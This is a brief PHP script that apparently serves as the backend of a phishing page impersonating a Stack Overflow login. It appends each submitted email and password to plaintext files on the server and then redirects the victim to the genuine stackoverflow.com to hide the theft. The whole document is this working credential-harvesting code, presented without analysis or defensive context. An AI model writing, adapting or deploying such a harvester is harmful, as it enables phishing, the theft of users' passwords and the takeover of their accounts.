<?php

file_put_contents("usernames.txt", "StackOverflow Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "StackOverflow Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.stackoverflow.com');
?>
